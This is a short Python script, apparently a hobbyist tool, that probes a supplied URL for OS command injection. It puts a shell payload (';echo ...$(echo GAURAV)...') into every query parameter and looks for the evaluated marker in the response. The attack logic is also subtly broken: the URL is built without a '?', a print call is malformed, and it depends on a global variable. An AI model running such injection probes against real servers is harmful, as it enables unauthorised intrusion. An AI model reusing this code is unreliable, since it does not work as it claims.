# -*- coding: utf-8 -*-
# @Copyright 2021 Gaurav Vijay Jadhav

#This script is for educational purpose only!!! 
# Created this simple command injection scaner file according to my use hope it will be useful


#Author details
#__AUTHOR_NAME__=GAURAV JADHAV
#__EMAIL__=jadhavgaurav.v@gmail.com
#__YOUTUBE__=NOOB_ACCCESS



from urllib.parse import parse_qsl, urlencode, urlsplit
import sys ,requests, re,time,argparse,getopt,sys,json,html




def scan_cmd(payload,url):
        param = dict(parse_qsl(urlsplit(url).query))
        tainted_params = {x: payload for x in param}
        #logs.create_log(logs_des,"Params : "+str(tainted_params))
        if len(tainted_params) > 0:
                attack_url = urlsplit(url).geturl() + urlencode(tainted_params)
                resp = requests.post(url=attack_url, data = payload)
                print(resp.text)
                if resp.status_code == 200:
                        if poc in resp.text:
                                attack_encode=html.escape(attack_url)
                                #logs.create_log(logs_des,"HTML Injection Found : "+str(attack_url))
                                print("Command Injection at %s\nInjection",attack_url)
                        else:
                                #logs.create_log(logs_des,"No HTML Injection Found  : "+str(url))
                                print("This URL is not Vulnerable" )


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-url',  help='Plase enter valid URL example: http://testphp.vulnweb.com/listproducts.php?cat=2')
    
    args = parser.parse_args()
    url = args.url

    #url = "http://172.16.22.167/commix-testbed/scenarios/regular/GET/classic.php?addr=1"
    payload =';echo ADD-CMD$((80+20))$(echo GAURAV)GAURAV'
	
    poc = "ADD-CMD100GAURAVGAURAV"
    scan_cmd(payload,url)

